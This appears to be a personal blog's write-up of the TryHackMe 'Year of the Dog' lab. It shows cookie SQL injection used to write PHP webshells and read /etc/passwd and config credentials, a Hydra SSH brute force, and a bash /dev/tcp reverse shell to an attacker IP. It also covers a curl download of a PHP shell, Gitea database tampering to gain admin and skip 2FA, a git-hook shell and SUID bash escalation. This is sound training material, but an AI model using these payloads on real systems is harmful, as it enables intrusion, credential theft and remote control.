@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Year of the Dog Write-up | TryHackMe Hard | Utkarsh M</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <header class="site-title-main">
+      Utkarsh M
+    </header>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/post/">Posts</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="post-container">
+  <div class="post-date">2022/07/12</div>
+  <h1 class="post-title">Year of the Dog Write-up | TryHackMe Hard</h1>
+</div>
+
+<main>
+<p>Always so polite&hellip;</p>
+<p><a href="https://tryhackme.com/room/yearofthedog">TryHackMe/Year of the Dog</a></p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<p>IP:<code>10.10.9.245</code></p>
+<p>Threader 3000 scan:</p>
+<pre><code class="language-sh">------------------------------------------------------------
+        Threader 3000 - Multi-threaded Port Scanner          
+                       Version 1.0.7                    
+                   A project by The Mayor               
+------------------------------------------------------------
+Enter your target IP address or URL here: 10.10.9.245
+------------------------------------------------------------
+Scanning target 10.10.9.245
+Time started: 2022-07-11 15:58:20.078838
+------------------------------------------------------------
+Port 22 is open
+Port 80 is open
+Port scan completed in 0:00:59.443309
+------------------------------------------------------------
+Threader3000 recommends the following Nmap scan:
+************************************************************
+nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.9.245 10.10.9.245
+</code></pre>
+<p>webserver: at <code>/</code></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711160619.png" alt=""></p>
+<p>Running suggested nmap scan:</p>
+<pre><code class="language-sh">nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.9.245 10.10.9.245
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 16:06 IST
+Nmap scan report for 10.10.9.245
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
+|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
+|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Canis Queue
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds
+------------------------------------------------------------
+Combined scan completed in 0:08:39.443157
+</code></pre>
+<p>Scanning for directories:</p>
+<pre><code class="language-sh">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.10.9.245/ -t 100 --no-error
+</code></pre>
+<p>output:</p>
+<pre><code>/assets               (Status: 301) [Size: 311] [--&gt; http://10.10.9.245/assets/]
+</code></pre>
+<p>Scanning for files:</p>
+<pre><code class="language-sh">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://10.10.9.245/ -t 100 --no-error
+</code></pre>
+<p>output:</p>
+<pre><code class="language-sh">/index.php            (Status: 200) [Size: 597]
+/wp-forum.phps        (Status: 403) [Size: 276]
+</code></pre>
+<p>exiftool on flag.png revealed nothing.</p>
+<p>nikto results:</p>
+<pre><code class="language-sh">nikto -h http://10.10.9.245/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.9.245
++ Target Hostname:    10.10.9.245
++ Target Port:        80
++ Start Time:         2022-07-11 16:12:44 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie id created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ /config.php: PHP Config file may contain database IDs and passwords.
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7517 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2022-07-11 16:34:46 (GMT5.5) (1322 seconds)
+</code></pre>
+<p>hmm, checking cookies:</p>
+<p>So there&rsquo;s this session id cookie: trying to modify it results in a error.</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711161508.png" alt=""></p>
+<p>adding <code>'</code> at the end of the cookie value results in a sql error. :p so can use sqli.</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711171127.png" alt=""></p>
+<p>I&rsquo;m kinda bad at sqli and I found this resource that I am following rn: <a href="https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/">LINK</a></p>
+<p>Finding the number of columns:</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711173213.png" alt=""></p>
+<p>So there are 2 columns . :O We can try to insert a webshell now:</p>
+<p>using the following payload</p>
+<pre><code class="language-html">Cookie: id=' union select 1, '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' into outfile '/var/www/dvwa/cmd.php' #
+</code></pre>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711173944.png" alt=""></p>
+<p>Obviously this isn&rsquo;t gonna be that easy. muiriiii!!!!</p>
+<p>obfuscated payload:</p>
+<pre><code>Cookie: id=' union select 1, '&lt;?php system($_GET[base64_decode('Y21k')]);?&gt;' into outfile '/var/www/html/cmd.phtml' #
+</code></pre>
+<p>doesn&rsquo;t work.</p>
+<p>getting some details:</p>
+<p>database name: <code>database()</code> : <code>webapp</code>
+user: <code>user()</code> : <code>web@localhost</code>
+version: <code>version()</code> : <code>5.7.34-0ubuntu0.18.04.1</code></p>
+<p>using the following payload to create a file:</p>
+<pre><code>Cookie: id=' union select 1, '' into outfile '/var/www/html/test.php' #
+</code></pre>
+<p>hmm, atleast we can create a file:
+<img src="/assets/img/thm/yotd/Pasted%20image%2020220711183534.png" alt=""></p>
+<p>loading <code>/etc/shadow</code>: <code>load_file('/etc/passwd')</code></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711185330.png" alt=""></p>
+<pre><code class="language-sh">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:109:114::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
+</code></pre>
+<p>So we have a username: <code>dylan</code></p>
+<p>reading contents of  <code>config.php</code>:</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711185555.png" alt=""></p>
+<pre><code class="language-sh">&lt;?php
+	$servername = &quot;localhost&quot;;
+	$username = &quot;web&quot;;
+	$password = &quot;Cda3RsDJga&quot;;
+	$dbname = &quot;webapp&quot;;
+
+	$dbh = new mysqli($servername, $username, $password, $dbname);
+	if ($dbh-&gt;connect_error){
+		die(&quot;Connection failed: &quot;. $dbh-&gt;connect_error);
+	}
+?&gt;
+</code></pre>
+<p>So we have a password here.</p>
+<p>password:<code>Cda3RsDJga</code></p>
+<p>Doesn&rsquo;t seem to work for dylan using ssh.</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711190120.png" alt=""></p>
+<p>Sqlmap:</p>
+<pre><code class="language-sh">sqlmap -u http://10.10.9.245/ --cookie='id=' -p id --level=2
+</code></pre>
+<p>results:</p>
+<pre><code class="language-sh">[19:22:37] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL &gt; 5.0.12
+</code></pre>
+<p>bruteforcing <code>dylan</code>&rsquo;s password on side:</p>
+<pre><code class="language-sh">hydra -l dylan -P /usr/share/dict/rockyou.txt 10.10.9.245 -t 64 ssh
+</code></pre>
+<p>contents of index.php:
+<img src="/assets/img/thm/yotd/Pasted%20image%2020220711194149.png" alt=""></p>
+<p>so its checking for certain bad strings.</p>
+<p>converting the payload <code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code> to hex and using it as payload:</p>
+<pre><code class="language-sh">Cookie: id=' union select  0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E, '' into outfile '/var/www/html/revshell.php' #
+</code></pre>
+<p>Works. I tried it earlier but inside the quotes somehow and it didn&rsquo;t work but anyways. ;-;</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711224800.png" alt=""></p>
+<p>using the following paylaod after URL encoding it: ( I already do have a listener setup at 4242):</p>
+<pre><code class="language-sh">bash -i &gt;&amp; /dev/tcp/10.17.47.158/4242 0&gt;&amp;1
+</code></pre>
+<p>hmm doesn&rsquo;t work.</p>
+<p>lets upload the infamous php shell.  I have hosted it with python3 web server from my machine.
+using the command <code>curl MY_IP/revshell.php --output kekeke.php</code></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711230419.png" alt=""></p>
+<p>stabilising the shell:</p>
+<pre><code class="language-sh">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+export TERM=xterm
+stty raw -echo; fg
+</code></pre>
+<p><code>/home/dylan/.gitconfig</code></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711230955.png" alt=""></p>
+<pre><code class="language-sh">name = Dylan
+email = dylan@yearofthedog.thm
+</code></pre>
+<p>Inside the <code>/home/dylan/work_analysis</code>:
+<img src="/assets/img/thm/yotd/Pasted%20image%2020220711231505.png" alt=""></p>
+<p>there is this text. trying the text after the username as password works.</p>
+<p>password:<code>Labr4d0rs4L1f3</code>
+<img src="/assets/img/thm/yotd/Pasted%20image%2020220711231607.png" alt=""></p>
+<h2 id="flag-1">Flag 1</h2>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220711231725.png" alt=""></p>
+<pre><code>THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}
+</code></pre>
+<h2 id="privilege-escalation---root">privilege escalation - root</h2>
+<p>in <code>/gitea/gitea/gitea.db</code></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712004149.png" alt=""></p>
+<p>Hmm, There&rsquo;s a password encrypted in argon2.</p>
+<p>running les:</p>
+<pre><code class="language-sh">./les.sh 
+
+Available information:
+
+Kernel version: 4.15.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 18.04
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+79 kernel space exploits
+49 user space exploits
+
+Possible Exploits:
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2018-18955] subuid_shell
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
+   Exposure: probable
+   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
+   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
+   Comments: CONFIG_USER_NS needs to be enabled
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2019-18634] sudo pwfeedback
+
+   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+   Exposure: less probable
+   Tags: mint=19
+   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
+   Comments: sudo configuration requires pwfeedback to be enabled.
+
+[+] [CVE-2019-15666] XFRM_UAF
+
+   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
+   Exposure: less probable
+   Download URL: 
+   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
+
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+   Details: https://seclists.org/oss-sec/2017/q1/184
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+
+[+] [CVE-2017-0358] ntfs-3g-modprobe
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
+   Exposure: less probable
+   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
+   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
+</code></pre>
+<p>Hmm couldn&rsquo;t exploit.</p>
+<pre><code class="language-sh">netstat -antup
+</code></pre>
+<p>An internal service is listening at <code>127.0.0.1:3000</code>.</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712004629.png" alt=""></p>
+<p>setting up ssh port forward:</p>
+<pre><code class="language-sh">ssh -L 6060:127.0.0.1:3000 dylan@10.10.87.8 -fN
+</code></pre>
+<p>we get the  gitea server&rsquo;s landing page:</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712005751.png" alt=""></p>
+<p>version: <code>Powered by Gitea Version: 1.13.0+dev-542-gbc11caff9 Page: **65ms** Template: **57ms**</code></p>
+<p>Dylan&rsquo;s credential works but requires 2fa.</p>
+<p>creating a new account :P</p>
+<p>hmm</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712011506.png" alt=""></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712011551.png" alt=""></p>
+<p>so using <code>.tables</code> we can see that there is a user table. :-; listing users:
+we can use <code>pragma table_info('user');</code> to list all the columns.</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712013336.png" alt=""></p>
+<p>hnm, so that this is an admin account. :O we have write access. lets change admin status of our new account.</p>
+<p>Changed is_admin status for new user.</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712014019.png" alt=""></p>
+<p>after uploading it:</p>
+<p>;-; hmm the server isn&rsquo;t working properly, restarting it.</p>
+<p>hmm weird, it kept crashing. I found this:</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712023401.png" alt=""></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712025555.png" alt=""></p>
+<p>after adding the header <code>Authorization: Basic ZHlsYW46TGFicjRkMHJzNEwxZjM=</code> :P  I was able to successfully login. :
+while adding the header to all the requests, successfully permanently disabled 2fa :p.</p>
+<p>At this point, It was like 5-6 a.m. and I kinda gave up and Just mostly followed a writeup ;-; to learn along the way.</p>
+<p>Added a shell in git hooks:</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712032634.png" alt=""></p>
+<p>now cloning it , making a change, commit and then pushing it to the server.</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712032759.png" alt=""></p>
+<p>after trying out multiple times, :-; I finally got a shell in dylan.:</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712034227.png" alt=""></p>
+<h2 id="privilege-escalation---root-container">Privilege escalation - root (Container):</h2>
+<p>gaining root in container:
+<img src="/assets/img/thm/yotd/Pasted%20image%2020220712034339.png" alt=""></p>
+<h2 id="privilege-escalation---root-">Privilege escalation - root :</h2>
+<p>copying bash elf.</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712034742.png" alt=""></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712034912.png" alt=""></p>
+<p>setting the suid bit of bash elf:</p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712041017.png" alt=""></p>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712041109.png" alt=""></p>
+<h2 id="flag-2">Flag 2</h2>
+<p><img src="/assets/img/thm/yotd/Pasted%20image%2020220712041156.png" alt=""></p>
+<pre><code class="language-sh">THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}
+</code></pre>
+
+</main>
+
+  <footer>
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/math-code.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/katex/dist/katex.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/katex/dist/contrib/auto-render.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/render-katex.js" defer></script>
+
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/center-img.min.js" defer></script>
+
+  
+  <hr/>
+  © <a href="https://utkar5hm.github.io">Utkarsh M</a> 2025 &ndash; 2025 | <a href="https://github.com/Utkar5hM">Github</a> | <a href="https://www.linkedin.com/in/utkar5hm/">Linkedin</a>
+  
+  </footer>
+  </body>
+</html>
+
